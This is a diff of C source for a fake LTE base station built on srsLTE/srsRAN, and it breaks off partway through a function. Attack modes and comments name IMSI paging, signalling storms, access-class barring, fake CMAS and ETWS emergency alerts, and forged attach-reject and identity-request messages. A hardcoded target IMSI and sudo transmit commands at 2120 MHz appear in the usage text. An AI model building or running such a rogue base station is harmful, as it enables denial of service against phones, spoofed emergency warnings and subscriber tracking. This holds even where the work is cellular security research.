@@ -1,1771 +1,2022 @@
-#include <uhd.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <strings.h>
-#include <unistd.h>
-#include <sys/select.h>
-#include <pthread.h>
-#include <semaphore.h>
-#include <signal.h>
-#include <srslte/phy/common/phy_common.h>
-#include <srslte/phy/phch/pdsch_cfg.h>
-#include "srslte/srslte.h"
-#include "srslte/phy/rf/rf.h"
-#include "srslte/phy/rf/rf_utils.h"
-#include "srslte/phy/common/phy_common.h"
-#include "../src/phy/rf/uhd_c_api.h"
-#include "pdsch_enodeb.h"
-#include "hj.h"
+/**
+ * Copyright 2013-2022 Software Radio Systems Limited
+ *
+ * This file is part of srsRAN.
+ *
+ * srsRAN is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU Affero General Public License as
+ * published by the Free Software Foundation, either version 3 of
+ * the License, or (at your option) any later version.
+ *
+ * srsRAN is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU Affero General Public License for more details.
+ *
+ * A copy of the GNU Affero General Public License can be found in
+ * the LICENSE file in the top-level directory of this distribution
+ * and at http://www.gnu.org/licenses/.
+ *
+ */
 
-#define UE_CRNTI 0xFFFF
-#define M_CRNTI 0xFFFD
-#define LEFT_KEY 68
-#define RIGHT_KEY 67
-#define UP_KEY 65
-#define DOWN_KEY 66
-#define PAGING_IMSI 0
-#define SIB1_SIG_STORM 1
-#define SIB2_AC_BARRING 2
-#define SIB1_MNC 3
-#define MIB_DLBW 4
-#define SIB1_CMAS 5
-#define PAGING_ETWS 6
+ #include "srsran/common/crash_handler.h"
+ #include "srsran/common/gen_mch_tables.h"
+ #include "srsran/srsran.h"
+ #include <getopt.h>
+ #include <pthread.h>
+ #include <semaphore.h>
+ #include <signal.h>
+ #include <stdio.h>
+ #include <stdlib.h>
+ #include <string.h>
+ #include <strings.h>
+ #include <sys/select.h>
+ #include <unistd.h>
+ #include <stdio.h>
+ #include <stdlib.h>
+ #include <string.h>
+ #include <dirent.h>
+ #include <sys/stat.h>
+ #include <errno.h>
+ #include <cjson/cJSON.h>
+  #define UE_CRNTI 0xFFFF
+ #define M_CRNTI 0xFFFD
+ 
+ #ifndef DISABLE_RF
+ #include "srsran/phy/common/phy_common.h"
+ #include "srsran/phy/rf/rf.h"
+ #include "srsran/phy/rf/rf_utils.h"
+ #include <limits.h>  // 定义了 PATH_MAX
 
-srslte_rf_t rf;
-int attack_mode = -1;
+char buffer[PATH_MAX];  // 使用系统标准路径长度
+ srsran_rf_t radio;
+ #else
+ #pragma message "Compiling pdsch_ue with no RF support"
+ #endif
+ 
+ static char* output_file_name = NULL;
+ 
+ #define LEFT_KEY 68
+ #define RIGHT_KEY 67
+ #define UP_KEY 65
+ #define DOWN_KEY 66
+ #define PAGE_UP 53
+ #define PAGE_DOWN 54
+ 
+ #define CFR_THRES_UP_KEY 't'
+ #define CFR_THRES_DN_KEY 'g'
+ 
+ #define CFR_THRES_STEP 0.05f
+ #define CFR_PAPR_STEP 0.1f
+ 
+ bool paging_msg = false;
+ bool sib1_msg = false;
+ bool sib2_msg = false;
+ bool po_msg = false;
+ bool ar_msg = false;
+ bool ir_msg = false;
+ bool ext_msg = false;
 
-cell_search_cfg_t cell_detect_config = {
-    SRSLTE_DEFAULT_MAX_FRAMES_PBCH,
-    SRSLTE_DEFAULT_MAX_FRAMES_PSS,
-    SRSLTE_DEFAULT_NOF_VALID_PSS_FRAMES,
-    0};
 
-srslte_cell_t cell = {
-    100,               // nof_prb
-    2,                 // nof_ports
-    420,               // cell_id
-    SRSLTE_CP_NORM,    // cyclic prefix
-    SRSLTE_PHICH_NORM, // PHICH length
-    SRSLTE_PHICH_R_1   // PHICH resources
-};
+ int sib2_period = 16;
+ int sib1_period = 2;
 
-uint16_t c = -1;
+ static cell_search_cfg_t cell_detect_config = {.max_frames_pbch      = SRSRAN_DEFAULT_MAX_FRAMES_PBCH,
+                                         .max_frames_pss       = SRSRAN_DEFAULT_MAX_FRAMES_PSS,
+                                         .nof_valid_pss_frames = SRSRAN_DEFAULT_NOF_VALID_PSS_FRAMES,
+                                         .init_agc             = 0,
+                                         .force_tdd            = false};
+ 
+ static srsran_ue_sync_t ue_sync;
+ static cf_t* sf_buffer_sync[SRSRAN_MAX_PORTS] = {NULL};
+ static cf_t* paging_buffer[SRSRAN_MAX_PORTS] = {NULL};
+ static cf_t* sib1_buffer[SRSRAN_MAX_PORTS] = {NULL};
+ static cf_t* sib2_buffer[SRSRAN_MAX_PORTS] = {NULL};
+ static cf_t* po_buffer[SRSRAN_MAX_PORTS] = {NULL};
+ static cf_t* ar_buffer[SRSRAN_MAX_PORTS] = {NULL};
+ static cf_t* ir_buffer[SRSRAN_MAX_PORTS] = {NULL};
+ static cf_t* ext_buffer[SRSRAN_MAX_PORTS] = {NULL};
 
-int net_port = -1; // -1 generates random data That means there is some problem sending samples to the device
+ static char* paging_file_name;
+ //static char* mib_file_name;
+ static char* sib1_file_name;
+ static char* sib2_file_name;
+ static char* ext_file_name;
 
-uint32_t cfi = 2;
-uint32_t mcs_idx = 1, last_mcs_idx = 1;
-int nof_frames = -1;
 
-char mimo_type_str[32] = "single";
-uint32_t nof_tb = 1;
-uint32_t multiplex_pmi = 0;
-uint32_t multiplex_nof_layers = 1;
+ static char* attachreject_file_name;
+ static char* identityrequest_file_name;
+ static char* pdcchorder_file_name;
 
-int mbsfn_area_id = -1;
-char *rf_args = "";
-char *input_file_sf9 = "output";
-float rf_amp = 0.8, rf_gain = 15.0, rf_freq = 2400000000;
-srslte_ue_sync_t ue_sync;
-srslte_ue_dl_t ue_dl;
-srslte_ue_mib_t ue_mib;
-int sfn;
-int rx_ret = -1; // 接收线程的状态变量 -1表示失败 0表示成功
-int sf_idx;
-bool updated = false;
+ char* cell_dir;
+ char* imsi  = "460017837217696";
+ char* attack_mode;
+ const char* cache_root = "./cache";  // 你的缓存根目录
+ char cell_config_path[256];
+ int target_tti;
 
-bool null_file_sink = false;
-srslte_filesink_t fsink;
-srslte_ofdm_t ifft[SRSLTE_MAX_PORTS];
-srslte_ofdm_t ifft_mbsfn;
-srslte_pbch_t pbch;
-srslte_pcfich_t pcfich;
-srslte_pdcch_t pdcch;
-srslte_pdsch_t pdsch;
-srslte_pdsch_cfg_t pdsch_cfg;
-srslte_pmch_t pmch;
-srslte_pdsch_cfg_t pmch_cfg;
-srslte_softbuffer_tx_t *softbuffers[SRSLTE_MAX_CODEWORDS];
-srslte_regs_t regs;
-srslte_ra_dl_dci_t ra_dl;
-int rvidx[SRSLTE_MAX_CODEWORDS] = {0, 0};
-
-cf_t *sf_buffer[SRSLTE_MAX_PORTS] = {NULL}, *output_buffer[SRSLTE_MAX_PORTS] = {NULL};
-cf_t *sf_buffer_sync[SRSLTE_MAX_PORTS] = {NULL};
-cf_t *output_buffer2[SRSLTE_MAX_PORTS] = {NULL};
-cf_t *output_buffer3[SRSLTE_MAX_PORTS] = {NULL};
-cf_t *output_buffer4[SRSLTE_MAX_PORTS] = {NULL};
-cf_t *output_buffer_offset[SRSLTE_MAX_PORTS] = {NULL};
-
-int sf_n_re, sf_n_samples;
-
-srslte_timestamp_t last_stamp;
-pthread_t net_thread;
-pthread_t tx_thread;
-pthread_t rx_thread;
-pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER; // 线程的互斥锁
-pthread_cond_t cond = PTHREAD_COND_INITIALIZER;
-void *net_thread_fnc(void *arg);
-sem_t net_sem;
-bool net_packet_ready = false;
-srslte_netsource_t net_source;
-srslte_netsink_t net_sink;
-
-int prbset_num = 1, last_prbset_num = 1;
-int prbset_orig = 0;
-
-#define DATA_BUFF_SZ 1024 * 1024
-uint8_t *data[2], data2[DATA_BUFF_SZ];
-uint8_t data_tmp[DATA_BUFF_SZ];
-
-void usage(char *prog) // 帮助菜单
-{
-    printf("Usage: %s [agmfoncvpuxb]\n", prog);
-    printf("\t-a RF args [Default %s]\n", rf_args);
-    printf("\t-l RF amplitude [Default %.2f]\n", rf_amp);
-    printf("\t-g RF TX gain [Default %.2f dB]\n", rf_gain);
-    printf("\t-f RF TX frequency [Default %.1f MHz]\n", rf_freq / 1000000);
-    printf("\t-D Demo case [0: IMSI paging, 1: CMAS, 2: Signalling Storm(TAU), 3: AC Barring\n");
-    printf("\t-i Input file name for IMSI paging, subframe 9 [Default %s]\n", input_file_sf9);
-    printf("\t-o output_file [Default use RF board]\n");
-    printf("\t-m MCS index [Default %d]\n", mcs_idx);
-    printf("\t-n number of frames [Default %d]\n", nof_frames);
-    printf("\t-c cell id [Default %d]\n", cell.id);
-    printf("\t-p nof_prb [Default %d]\n", cell.nof_prb);
-    printf("\t-M MBSFN area id [Default %d]\n", mbsfn_area_id);
-    printf("\t-x Transmission mode[single|diversity|cdd|multiplex] [Default %s]\n", mimo_type_str);
-    printf("\t-b Precoding Matrix Index (multiplex mode only)* [Default %d]\n", multiplex_pmi);
-    printf("\t-w Number of codewords/layers (multiplex mode only)* [Default %d]\n", multiplex_nof_layers);
-    printf("\t-u listen TCP port for input data (-1 is random) [Default %d]\n", net_port);
-    printf("\t-v [set srslte_verbose to debug, default none]\n");
-    printf("\n");
-    printf("\t*: See 3GPP 36.212 Table  5.3.3.1.5-4 for more information\n");
-}
-
-void parse_args(int argc, char **argv)
+ static uint32_t max_num_samples;
+ static srsran_ue_mib_t ue_mib;
+ static srsran_ue_dl_t ue_dl;
+ 
+ static srsran_ue_dl_cfg_t ue_dl_cfg;
+ static srsran_dl_sf_cfg_t dl_sf;
+ static srsran_chest_dl_cfg_t chest_pdsch_cfg = {};
+ 
+ static pthread_t tx_thread;
+ static pthread_t rx_thread;
+ static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER; 
+ static pthread_cond_t cond  = PTHREAD_COND_INITIALIZER;
+ static srsran_timestamp_t last_stamp;
+ 
+ static int rx_ret = -1;
+ static bool updated = false;
+ static uint32_t sfn;
+ static int sf_idx;
+ 
+ static srsran_cell_t cell = {};
+ 
+ static int      net_port = -1; // -1 generates random dataThat means there is some problem sending samples to the device
+ static uint32_t cfi      = 1;
+ static uint32_t mcs_idx = 1, last_mcs_idx = 1;
+ static int      nof_frames              = -1;
+ static srsran_tm_t transmission_mode    = SRSRAN_TM1;
+ static uint32_t    nof_tb               = 1;
+ static uint32_t    multiplex_pmi        = 0;
+ static uint32_t    multiplex_nof_layers = 1;
+ static uint8_t     mbsfn_sf_mask        = 32;
+ static int         mbsfn_area_id        = -1;
+ static char*       rf_args              = "";
+ static char*       rf_dev               = "";
+ static float       rf_amp = 0.8, rf_gain = 15.0, rf_freq = 2400000000;
+ static bool        enable_256qam         = false;
+ static float       output_file_snr       = +INFINITY;
+ static bool        use_standard_lte_rate = false;
+ 
+ 
+ // CFR runtime control flags
+ static bool cfr_thr_inc = false;
+ static bool cfr_thr_dec = false;
+ 
+ typedef struct {
+   int   enable;
+   char* mode;
+   float manual_thres;
+   float strength;
+   float auto_target_papr;
+   float ema_alpha;
+ } cfr_args_t;
+ 
+ static cfr_args_t cfr_args = {.enable           = 0,
+                               .mode             = "manual",
+                               .manual_thres     = 1.0f,
+                               .strength         = 1.0f,
+                               .auto_target_papr = 8.0f,
+                               .ema_alpha        = 1.0f / (float)SRSRAN_CP_NORM_NSYMB};
+ 
+ static bool                    null_file_sink = false;
+ static srsran_filesink_t       fsink;
+ static srsran_ofdm_t           ifft[SRSRAN_MAX_PORTS];
+ static srsran_ofdm_t           ifft_mbsfn;
+ static srsran_pbch_t           pbch;
+ static srsran_pcfich_t         pcfich;
+ static srsran_pdcch_t          pdcch;
+ static srsran_pdsch_t          pdsch;
+ static srsran_pdsch_cfg_t      pdsch_cfg;
+ static srsran_pmch_t           pmch;
+ static srsran_pmch_cfg_t       pmch_cfg;
+ static srsran_softbuffer_tx_t* softbuffers[SRSRAN_MAX_CODEWORDS];
+ static srsran_regs_t           regs;
+ static srsran_dci_dl_t         dci_dl;
+ static int                     rvidx[SRSRAN_MAX_CODEWORDS] = {0, 0};
+ static srsran_cfr_cfg_t        cfr_config                  = {};
+ 
+ static cf_t *   sf_buffer[SRSRAN_MAX_PORTS] = {NULL}, *output_buffer[SRSRAN_MAX_PORTS] = {NULL};
+ static uint32_t sf_n_re, sf_n_samples, else_sf_n_samples;
+ 
+ static pthread_t          net_thread;
+ static void*              net_thread_fnc(void* arg);
+ static sem_t              net_sem;
+ static bool               net_packet_ready = false;
+ static srsran_netsource_t net_source;
+ static srsran_netsink_t   net_sink;
+ 
+ static int prbset_num = 1, last_prbset_num = 1;
+ static int prbset_orig = 0;
+ 
+ #define DATA_BUFF_SZ 1024 * 1024
+ static uint8_t *data_mbms, *data[2], data2[DATA_BUFF_SZ];
+ static uint8_t  data_tmp[DATA_BUFF_SZ];
+ 
+ static void usage(char* prog)
+ {
+   printf("Usage: %s [Iagmfoncvpuxb]\n", prog);
+ #ifndef DISABLE_RF
+     printf("\t-I RF device [Default %s]\n", rf_dev);
+   printf("\t-a RF args [Default %s]\n", rf_args);
+   printf("\t-l RF amplitude [Default %.2f]\n", rf_amp);
+   printf("\t-g RF TX gain [Default %.2f dB]\n", rf_gain);
+   printf("\t-f RF TX frequency [Default %.1f MHz]\n", rf_freq / 1000000);
+ #else
+   printf("\t   RF is disabled.\n");
+ #endif
+   printf("\t-o output_file [Default use RF board]\n");
+   printf("\t-m MCS index [Default %d]\n", mcs_idx);
+   printf("\t-n number of frames [Default %d]\n", nof_frames);
+   printf("\t-c cell id [Default %d]\n", cell.id);
+   printf("\t-p nof_prb [Default %d]\n", cell.nof_prb);
+   printf("\t-M MBSFN area id [Default %d]\n", mbsfn_area_id);
+   printf("\t-x Transmission mode [1-4] [Default %d]\n", transmission_mode + 1);
+   printf("\t-b Precoding Matrix Index (multiplex mode only)* [Default %d]\n", multiplex_pmi);
+   printf("\t-w Number of codewords/layers (multiplex mode only)* [Default %d]\n", multiplex_nof_layers);
+   printf("\t-u listen TCP/UDP port for input data (if mbsfn is active then the stream is over mbsfn only) (-1 is "
+          "random) [Default %d]\n",
+          net_port);
+   printf("\t-v [set srsran_verbose to debug, default none]\n");
+   printf("\t-s output file SNR [Default %f]\n", output_file_snr);
+   printf("\t-q Enable/Disable 256QAM modulation (default %s)\n", enable_256qam ? "enabled" : "disabled");
+   printf("\t-Q Use standard LTE sample rates (default %s)\n", use_standard_lte_rate ? "enabled" : "disabled");
+   printf("CFR Options:\n");
+   printf("\t--enable_cfr       Enable the CFR (default %s)\n", cfr_args.enable ? "enabled" : "disabled");
+   printf("\t--cfr_mode         CFR mode: manual, auto_cma, auto_ema. (default %s)\n", cfr_args.mode);
+   printf("\t--cfr_manual_thres CFR manual threshold (default %.2f)\n", cfr_args.manual_thres);
+   printf("\t--cfr_strength     CFR strength (default %.2f)\n", cfr_args.strength);
+   printf("\t--cfr_auto_papr    CFR PAPR target for auto modes (default %.2f)\n", cfr_args.auto_target_papr);
+   printf("\t--cfr_ema_alpha    CFR alpha parameter for EMA mode (default %.2f)\n", cfr_args.ema_alpha);
+   printf("\n");
+   printf("\t*: See 3GPP 36.212 Table  5.3.3.1.5-4 for more information\n");
+   //例子
+   printf("\nExample:\n");
+ 
+   printf("\tpaging_systeminfomodification: \n\t sudo ./lib/examples/pdsch_enodeb -f 2120e6 -I UHD -x 2 -a clock=external,master_clock_rate=30.72e6,serial=3332A71 -g 70 -i output_paging_sysinfmod\n");
+   printf("\tpaging_imsi: \n\t sudo ./lib/examples/pdsch_enodeb -f 2120e6 -I UHD -x 2 -a clock=external,master_clock_rate=30.72e6,serial=3332A71 -g 70 -i output_paging_imsi\n");
+   printf("\tsib1_systeminfovaluetag: \n\t sudo ./lib/examples/pdsch_enodeb -f 2120e6 -I UHD -x 2 -a clock=external,master_clock_rate=30.72e6,serial=3332A71 -g 70 -i output_sib1_sysinfvaltag\n");
+   printf("\tsib1_tac: \n\t sudo ./lib/examples/pdsch_enodeb -f 2120e6 -I UHD -x 2 -a clock=external,master_clock_rate=30.72e6,serial=3332A71 -g 70 -i output_sib1_tac\n");
+   printf("\tsib2_acbarring: \n\t sudo ./lib/examples/pdsch_enodeb -f 2120e6 -I UHD -x 2 -a clock=external,master_clock_rate=30.72e6,serial=3332A71 -g 70 -i output_sib2_acbarring\n");
+ }
+ struct option cfr_opts[] = {    {"type", required_argument, 0, 't'},  // 新增 --type
+ {"enable_cfr", no_argument, &cfr_args.enable, 1},
+                             {"cfr_mode", required_argument, NULL, 'C'},
+                             {"cfr_manual_thres", required_argument, NULL, 'T'},
+                             {"cfr_strength", required_argument, NULL, 'S'},
+                             {"cfr_auto_papr", required_argument, NULL, 'P'},
+                             {"cfr_ema_alpha", required_argument, NULL, 'e'},
+                             {0, 0, 0, 0}};
+ 
+ static void parse_args(int argc, char** argv)
 {
     int opt;
-    while ((opt = getopt(argc, argv, "DiaglfmoncpvutxbwM")) != -1)
-    {
-        switch (opt)
-        {
-        case 'D': // 选择的攻击类型
-            attack_mode = atoi(argv[optind]);
-            if (attack_mode == PAGING_IMSI) // 0
-                printf("\033[1;32m[+] 当前选择的攻击类型: Paging-IMSI\n\033[0m");
-            else if (attack_mode == SIB1_SIG_STORM) // 1
-                printf("\033[1;32m[+] 当前选择的攻击类型: SIB1_SIG_STORM\n\033[0m");
-            else if (attack_mode == SIB2_AC_BARRING) // 2
-                printf("\033[1;32m[+] 当前选择的攻击类型: SIB2_AC_BARRING\n\033[0m");
-            else if (attack_mode == SIB1_MNC) // 3
-                printf("\033[1;32m[+] 当前选择的攻击类型: SIB1_MNC\n\033[0m");
-            else if (attack_mode == MIB_DLBW) // 4
-                printf("\033[1;32m[+] 当前选择的攻击类型: MIB_DLBW\n\033[0m");
-            else if (attack_mode == SIB1_CMAS) // 5
-                printf("\033[1;32m[+] 当前选择的攻击类型: SIB1_CMAS\n\033[0m");
-            else if (attack_mode == PAGING_ETWS) // 6
-                printf("\033[1;32m[+] 当前选择的攻击类型: PAGING_ETWS\n\033[0m");
-            break;
-        case 'i': // 输入文件
-            input_file_sf9 = argv[optind];
-            break;
-        case 'a': // usrp 的参数
-            rf_args = argv[optind];
-            break;
-        case 'g': // 增益
-            rf_gain = atof(argv[optind]);
-            break;
-        case 'l':
-            rf_amp = atof(argv[optind]);
-            break;
-        case 'f': // 小区的频率，即发送和接收的频率
-            rf_freq = atof(argv[optind]);
-            break;
-        case 'm':
-            mcs_idx = atoi(argv[optind]);
-            break;
-        case 'u':
-            net_port = atoi(argv[optind]);
-            break;
-        case 'n':
-            nof_frames = atoi(argv[optind]);
-            break;
-        case 'p':
-            cell.nof_prb = atoi(argv[optind]);
-            break;
-        case 'c':
-            cell.id = atoi(argv[optind]);
-            break;
-        case 'x':
-            strncpy(mimo_type_str, argv[optind], 31);
-            mimo_type_str[31] = 0;
-            break;
-        case 'b':
-            multiplex_pmi = (uint32_t)atoi(argv[optind]);
-            break;
-        case 'w':
-            multiplex_nof_layers = (uint32_t)atoi(argv[optind]);
-            break;
-        case 'M':
-            mbsfn_area_id = atoi(argv[optind]);
-            break;
-        case 'v': // 更详细的输出
-            srslte_verbose++;
-            break;
-        default:
-            usage(argv[0]);
-            exit(-1);
-        }
-    }
-}
-
-// 封装 RF 接收接口，把 srsLTE 里统一的数据格式 (cf_t*) 转换成底层驱动需要的 void*；
-// 顺带把接收时间戳记录下来，方便上层调用，不用直接操作 srslte_rf_recv_with_time_multi
-#ifndef DISABLE_RF
-int srslte_rf_recv_wrapper(void *h, cf_t *data[SRSLTE_MAX_PORTS], uint32_t nsamples, srslte_timestamp_t *t)
-{
-    // printf(" ----  Receive %d samples  ---- \n", nsamples);
-    void *ptr[SRSLTE_MAX_PORTS];
-    for (int i = 0; i < SRSLTE_MAX_PORTS; i++)
-    {
-        ptr[i] = data[i];
-    }
-    // return srslte_rf_recv_with_time_multi(h, ptr, nsamples, true, NULL, NULL);
-    return srslte_rf_recv_with_time_multi(h, ptr, nsamples, true, &(t->full_secs), &(t->frac_secs));
-}
-#endif
-
-// 封装一个安全的 buffer 分配并清零函数
-void *alloc_cf_buffer(size_t nsamples, const char *name)
-{
-    void *buf = srslte_vec_malloc(sizeof(cf_t) * nsamples);
-    if (!buf)
-    {
-        fprintf(stderr, "Error allocating %s buffer\n", name);
-        perror("malloc");
-        exit(-1);
-    }
-    memset(buf, 0, sizeof(cf_t) * nsamples);
-    return buf;
-}
-
-// 封装成给所有端口分配的函数
-void alloc_buffer_array(void *buffers[], int nports, size_t nsamples, const char *name)
-{
-    for (int i = 0; i < nports; i++)
-    {
-        buffers[i] = alloc_cf_buffer(nsamples, name);
-    }
-}
-
-void base_init()
-{
-    int i;
-    /* Select transmission mode */
-    if (srslte_str2mimotype(mimo_type_str, &pdsch_cfg.mimo_type))
-    {
-        ERROR("Wrong transmission mode! Allowed modes: single, diversity, cdd and multiplex");
-        exit(-1);
-    }
-
-    /* Configure cell and PDSCH in function of the transmission mode */
-    switch (pdsch_cfg.mimo_type)
-    {
-    case SRSLTE_MIMO_TYPE_SINGLE_ANTENNA:
-        cell.nof_ports = 1;
-        break;
-    case SRSLTE_MIMO_TYPE_TX_DIVERSITY:
-        cell.nof_ports = 2;
-        break;
-    case SRSLTE_MIMO_TYPE_CDD:
-        cell.nof_ports = 2;
-        break;
-    case SRSLTE_MIMO_TYPE_SPATIAL_MULTIPLEX:
-        cell.nof_ports = 2;
-        break;
-    default:
-        ERROR("Transmission mode not implemented.");
-        exit(-1);
-    }
-
-    /* Allocate memory */
-    for (i = 0; i < SRSLTE_MAX_CODEWORDS; i++)
-    {
-        data[i] = srslte_vec_malloc(sizeof(uint8_t) * SOFTBUFFER_SIZE);
-        if (!data[i])
-        {
-            perror("malloc");
-            exit(-1);
-        }
-        bzero(data[i], sizeof(uint8_t) * SOFTBUFFER_SIZE);
-    }
-
-    /* init memory */
-    alloc_buffer_array((void **)sf_buffer, SRSLTE_MAX_PORTS, sf_n_re, "sf_buffer");
-    alloc_buffer_array((void **)output_buffer, SRSLTE_MAX_PORTS, sf_n_samples * 1.2, "output_buffer");
-    alloc_buffer_array((void **)output_buffer2, SRSLTE_MAX_PORTS, sf_n_samples * 1.2, "output_buffer2");
-    alloc_buffer_array((void **)output_buffer3, SRSLTE_MAX_PORTS, sf_n_samples * 1.2, "output_buffer3");
-    alloc_buffer_array((void **)output_buffer4, SRSLTE_MAX_PORTS, sf_n_samples * 1.2, "output_buffer4");
-    alloc_buffer_array((void **)output_buffer_offset, SRSLTE_MAX_PORTS, sf_n_samples * 1.2, "output_buffer_offset");
-
-    printf("\033[1;32m[+] 正在尝试打开射频设备...\n\033[0m");
-    if (srslte_rf_open_multi(&rf, rf_args, cell.nof_ports))
-    {
-        printf("\033[1;33m[+] 射频设备打开失败,请确认设备已连接\n\033[0m");
-        exit(-1);
-    }
-
-    if (net_port > 0)
-    {
-        if (srslte_netsource_init(&net_source, "0.0.0.0", net_port, SRSLTE_NETSOURCE_TCP))
-        {
-            fprintf(stderr, "Error creating input UDP socket at port %d\n", net_port);
-            exit(-1);
-        }
-        if (null_file_sink)
-        {
-            if (srslte_netsink_init(&net_sink, "127.0.0.1", net_port + 1, SRSLTE_NETSINK_TCP))
-            {
-                fprintf(stderr, "Error sink\n");
+    while ((opt = getopt_long(argc, argv, "h:i:I:a:g:l:f:o:m:u:n:p:c:x:b:w:M:v:s:B:q:Q:E:C:T:S:P:e:t:", cfr_opts, NULL)) != -1) {
+        switch (opt) {
+            case 'h':
+                usage(argv[0]);
                 exit(-1);
-            }
-        }
-        if (sem_init(&net_sem, 0, 1))
-        {
-            perror("sem_init");
-            exit(-1);
-        }
-    }
-
-    /* create ifft object */
-    for (i = 0; i < cell.nof_ports; i++)
-    {
-        if (srslte_ofdm_tx_init(&ifft[i], SRSLTE_CP_NORM, sf_buffer[i], output_buffer[i], cell.nof_prb))
-        {
-            fprintf(stderr, "Error creating iFFT object\n");
-            exit(-1);
-        }
-
-        srslte_ofdm_set_normalize(&ifft[i], true);
-    }
-
-    if (srslte_ofdm_tx_init_mbsfn(&ifft_mbsfn, SRSLTE_CP_EXT, sf_buffer[0], output_buffer[0], cell.nof_prb))
-    {
-        fprintf(stderr, "Error creating iFFT object\n");
-        exit(-1);
-    }
-    srslte_ofdm_set_non_mbsfn_region(&ifft_mbsfn, 2);
-    srslte_ofdm_set_normalize(&ifft_mbsfn, true);
-
-    if (srslte_pbch_init(&pbch))
-    {
-        fprintf(stderr, "Error creating PBCH object\n");
-        exit(-1);
-    }
-    if (srslte_pbch_set_cell(&pbch, cell))
-    {
-        fprintf(stderr, "Error creating PBCH object\n");
-        exit(-1);
-    }
-
-    if (srslte_regs_init(&regs, cell))
-    {
-        fprintf(stderr, "Error initiating regs\n");
-        exit(-1);
-    }
-    if (srslte_pcfich_init(&pcfich, 1))
-    {
-        fprintf(stderr, "Error creating PBCH object\n");
-        exit(-1);
-    }
-    if (srslte_pcfich_set_cell(&pcfich, &regs, cell))
-    {
-        fprintf(stderr, "Error creating PBCH object\n");
-        exit(-1);
-    }
-    if (srslte_pdcch_init_enb(&pdcch, cell.nof_prb))
-    {
-        fprintf(stderr, "Error creating PDCCH object\n");
-        exit(-1);
-    }
-    if (srslte_pdcch_set_cell(&pdcch, &regs, cell))
-    {
-        fprintf(stderr, "Error creating PDCCH object\n");
-        exit(-1);
-    }
-    if (srslte_pdsch_init_enb(&pdsch, cell.nof_prb))
-    {
-        fprintf(stderr, "Error creating PDSCH object\n");
-        exit(-1);
-    }
-    if (srslte_pdsch_set_cell(&pdsch, cell))
-    {
-        fprintf(stderr, "Error creating PDSCH object\n");
-        exit(-1);
-    }
-    srslte_pdsch_set_rnti(&pdsch, UE_CRNTI);
-    if (mbsfn_area_id > -1)
-    {
-        if (srslte_pmch_init(&pmch, cell.nof_prb))
-        {
-            fprintf(stderr, "Error creating PMCH object\n");
-        }
-        srslte_pmch_set_area_id(&pmch, mbsfn_area_id);
-    }
-    for (i = 0; i < SRSLTE_MAX_CODEWORDS; i++)
-    {
-        softbuffers[i] = calloc(sizeof(srslte_softbuffer_tx_t), 1);
-        if (!softbuffers[i])
-        {
-            fprintf(stderr, "Error allocating soft buffer\n");
-            exit(-1);
-        }
-        if (srslte_softbuffer_tx_init(softbuffers[i], cell.nof_prb))
-        {
-            fprintf(stderr, "Error initiating soft buffer\n");
-            exit(-1);
-        }
-    }
-}
-
-void base_free()
-{
-    int i;
-    for (i = 0; i < SRSLTE_MAX_CODEWORDS; i++)
-    {
-        srslte_softbuffer_tx_free(softbuffers[i]);
-        if (softbuffers[i])
-        {
-            free(softbuffers[i]);
-        }
-    }
-    srslte_pdsch_free(&pdsch);
-    srslte_pdcch_free(&pdcch);
-    srslte_regs_free(&regs);
-    srslte_pbch_free(&pbch);
-    if (mbsfn_area_id > -1)
-    {
-        srslte_pmch_free(&pmch);
-    }
-    srslte_ofdm_tx_free(&ifft_mbsfn);
-    for (i = 0; i < cell.nof_ports; i++)
-    {
-        srslte_ofdm_tx_free(&ifft[i]);
-    }
-
-    for (i = 0; i < SRSLTE_MAX_CODEWORDS; i++)
-    {
-        if (data[i])
-        {
-            free(data[i]);
-        }
-    }
-
-    for (i = 0; i < SRSLTE_MAX_PORTS; i++)
-    {
-        if (sf_buffer[i])
-        {
-            free(sf_buffer[i]);
-        }
-        if (sf_buffer_sync[i])
-        {
-            free(sf_buffer_sync[i]);
-        }
-
-        if (output_buffer[i])
-        {
-            free(output_buffer[i]);
-        }
-        if (output_buffer2[i])
-        {
-            free(output_buffer2[i]);
-        }
-        if (output_buffer3[i])
-        {
-            free(output_buffer3[i]);
-        }
-        if (output_buffer4[i])
-        {
-            free(output_buffer4[i]);
-        }
-        if (output_buffer_offset[i])
-        {
-            free(output_buffer_offset[i]);
-        }
-    }
-
-    srslte_rf_close(&rf);
-
-    if (net_port > 0)
-    {
-        srslte_netsource_free(&net_source);
-        sem_close(&net_sem);
-    }
-}
-
-bool go_exit = false;
-void sig_int_handler(int signo)
-{
-    printf("\033[1;33m\n[+] 已收到终止信号, 尝试退出程序...\n\033[0m");
-    if (signo == SIGINT)
-    {
-        go_exit = true;
-        updated = true;
-        pthread_cond_signal(&cond);
-    }
-}
-
-unsigned int
-reverse(register unsigned int x)
-{
-    x = (((x & 0xaaaaaaaa) >> 1) | ((x & 0x55555555) << 1));
-    x = (((x & 0xcccccccc) >> 2) | ((x & 0x33333333) << 2));
-    x = (((x & 0xf0f0f0f0) >> 4) | ((x & 0x0f0f0f0f) << 4));
-    x = (((x & 0xff00ff00) >> 8) | ((x & 0x00ff00ff) << 8));
-    return ((x >> 16) | (x << 16));
-}
-
-uint32_t prbset_to_bitmask()
-{
-    uint32_t mask = 0;
-    int nb = (int)ceilf((float)cell.nof_prb / srslte_ra_type0_P(cell.nof_prb));
-    for (int i = 0; i < nb; i++)
-    {
-        if (i >= prbset_orig && i < prbset_orig + prbset_num)
-        {
-            mask = mask | (0x1 << i);
-        }
-    }
-    return reverse(mask) >> (32 - nb);
-}
-
-int update_radl()
-{
-
-    /* Configure cell and PDSCH in function of the transmission mode */
-    switch (pdsch_cfg.mimo_type)
-    {
-    case SRSLTE_MIMO_TYPE_SINGLE_ANTENNA:
-        pdsch_cfg.nof_layers = 1;
-        nof_tb = 1;
-        break;
-    case SRSLTE_MIMO_TYPE_TX_DIVERSITY:
-        pdsch_cfg.nof_layers = 2;
-        nof_tb = 1;
-        break;
-    case SRSLTE_MIMO_TYPE_CDD:
-        pdsch_cfg.nof_layers = 2;
-        nof_tb = 2;
-        break;
-    case SRSLTE_MIMO_TYPE_SPATIAL_MULTIPLEX:
